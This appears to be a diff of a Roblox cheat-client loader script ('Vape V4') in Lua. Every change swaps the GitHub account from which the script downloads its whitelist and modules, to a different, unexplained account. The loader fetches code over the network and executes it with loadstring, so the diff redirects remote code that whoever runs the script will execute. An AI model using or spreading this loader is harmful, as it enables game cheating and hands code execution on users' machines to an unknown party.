@@ -1,5 +1,5 @@
 -- Whitelist check
-local whitelist = loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeV4Script/VapeV4Script/main/whitelist.lua", true))()
+local whitelist = loadstring(game:HttpGet("https://raw.githubusercontent.com/nigerianprince293892/VapeV4Script/main/whitelist.lua", true))()
 if not whitelist[game.Players.LocalPlayer.Name] then
     game.Players.LocalPlayer:Kick("Not whitelisted.")
 end
@@ -19,7 +19,7 @@ end
 local function downloadFile(path, func)
     if not isfile(path) then
         local suc, res = pcall(function()
-            return game:HttpGet('https://raw.githubusercontent.com/VapeV4Script/VapeV4Script/main/' .. select(1, path:gsub('newvape/', '')), true)
+            return game:HttpGet('https://raw.githubusercontent.com/nigerianprince293892/VapeV4Script/main/' .. select(1, path:gsub('newvape/', '')), true)
         end)
         if not suc or res == '404: Not Found' then
             error(res)
@@ -50,7 +50,7 @@ end
 
 if not shared.VapeDeveloper then
     local _, subbed = pcall(function()
-        return game:HttpGet('https://github.com/VapeV4Script/VapeV4Script')
+        return game:HttpGet('https://github.com/nigerianprince293892/VapeV4Script')
     end)
     local commit = subbed:find('currentOid')
     commit = commit and subbed:sub(commit + 13, commit + 52) or nil
